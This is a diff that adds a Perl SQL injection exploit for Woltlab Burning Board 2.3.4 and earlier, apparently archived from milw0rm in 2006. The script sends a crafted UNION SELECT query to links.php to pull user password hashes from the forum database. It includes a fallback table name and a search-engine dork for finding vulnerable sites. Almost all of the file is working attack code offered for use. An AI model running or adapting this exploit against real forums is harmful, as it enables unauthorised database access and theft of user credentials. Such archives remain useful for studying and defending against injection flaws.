@@ -1,0 +1,75 @@
+#!/usr/bin/perl
+
+use IO::Socket;
+
+print q{
+################################################################################
+##                                                                            ##
+##  Woltlab Burning Board 2.3.4 <= "links.php" SQL Injection Exploit          ##
+##  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -       ##
+##  Exploit by       |  666 (SR-Crew)                                         ##
+##  Bug by           |  x82                                                   ##
+##  Googledork       |  inurl:/wbb2/links.php?cat                             ##
+##  Usage            |  links.pl [server] [path]                              ##
+##  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -       ##
+##                                                                            ##
+################################################################################
+
+};
+
+$webpage = $ARGV[0];
+$directory = $ARGV[1];
+
+if (!$webpage||!$directory) { die "[+] Exploit failed\n"; }
+
+$wbb_dir = 
+"http://".$webpage.$directory."links.php?cat=31337+union+select+password,userid+from+bb1_users";
+
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$webpage", 
+PeerPort=>"80") || die "[+] Can't connect to Server\n";
+print "[+] Exploiting....\n";
+print $sock "GET $wbb_dir HTTP/1.1\n";
+print $sock "Accept: */*\n";
+print $sock "User-Agent: Hacker\n";
+print $sock "Host: $webpage\n";
+print $sock "Connection: close\n\n";
+
+while ($answer = <$sock>) {
+	if ($answer =~ 
+/(................................)<\/span><\/b><\/font>/) {
+		print "[+] Hash: $1\n";
+		exit();
+	}
+	if ($answer =~ /SQL-DATABASE ERROR/) {
+		break;
+	}
+}
+
+$wbb_dir = 
+"http://".$webpage.$directory."links.php?cat=31337+union+select+password,userid+from+bb1_users";
+close($sock);
+
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$webpage", 
+PeerPort=>"80") || die "[+] Can't connect to Server\n";
+print $sock "GET $wbb_dir HTTP/1.1\n";
+print $sock "Accept: */*\n";
+print $sock "User-Agent: Hacker\n";
+print $sock "Host: $webpage\n";
+print $sock "Connection: close\n\n";
+
+while ($answer = <$sock>) {
+	if ($answer =~ 
+/(................................)<\/span><\/b><\/font>/) {
+		print "[+] Hash: $1\n";
+		exit();
+	}
+	if ($answer =~ /SQL-DATABASE ERROR/) {
+		print "[+] Try replacing bb1_users with bb2_users\n";
+		break;
+	}
+}
+close($sock);
+
+print "[+] Exploit failed\n";
+
+# milw0rm.com [2006-05-20]
